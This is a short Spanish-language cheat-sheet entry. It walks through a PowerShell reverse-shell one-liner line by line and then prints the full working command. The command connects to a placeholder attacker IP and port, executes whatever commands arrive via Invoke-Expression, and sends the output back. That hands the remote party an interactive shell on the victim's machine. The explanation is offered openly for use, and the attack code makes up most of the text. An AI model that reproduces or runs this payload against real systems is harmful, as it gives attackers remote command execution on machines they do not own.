one-liner de PowerShell para establecer una reverse shell:
one-liner de PowerShell para establecer una reverse shell:

1. `powershell -c "`: Esto indica que se está ejecutando PowerShell y que se proporcionará un comando a través de la opción `-c`, que permite ejecutar un comando como argumento de la línea de comandos de PowerShell.
    
2. `"$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);"`: Esta parte del código crea un objeto `TcpClient` de .NET para establecer una conexión TCP con la dirección IP y el puerto especificados del atacante. Reemplaza `'tu_ip'` y `'tu_puerto'` con la dirección IP y el puerto del atacante.
    
3. `"$stream = $client.GetStream();"`: Se obtiene el flujo de datos asociado con el cliente TCP recién creado.
    
4. `"[byte[]]$bytes = 0..65535|%{0};"`: Se inicializa un arreglo de bytes vacío con una longitud máxima de 65536 bytes. Esto se usará para almacenar los datos recibidos de la conexión.
    
5. `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;`: Se inicia un bucle `while` que continúa leyendo datos del flujo hasta que no hay más datos disponibles.
    
6. `;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`: Se convierten los bytes leídos en una cadena ASCII.
    
7. `;$sendback = (iex $data 2>&1 | Out-String );`: Se ejecuta el comando recibido (`$data`) utilizando `iex`, que es un alias para el cmdlet `Invoke-Expression`. Esto ejecuta el comando y captura su salida. El `2>&1` redirige los errores a la salida estándar. `Out-String` convierte la salida en una cadena para su posterior envío.
    
8. `;$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`: Se crea una cadena que contiene la salida del comando ejecutado y la ruta del directorio actual de PowerShell, para simular un indicador de comando (`PS`).
    
9. `;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`: Se convierte la cadena `$sendback2` en una secuencia de bytes utilizando codificación ASCII.
    
10. `;$stream.Write($sendbyte,0,$sendbyte.Length);`: Se envían los bytes al flujo de datos para que sean transmitidos al atacante.
    
11. `;$stream.Flush()};`: Se vacía el búfer de salida para asegurarse de que todos los datos se envíen al atacante.
    
12. `$client.Close()"`: Se cierra la conexión TCP con el atacante una vez que el bucle `while` ha terminado de ejecutarse.
```

powershell -c "$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```
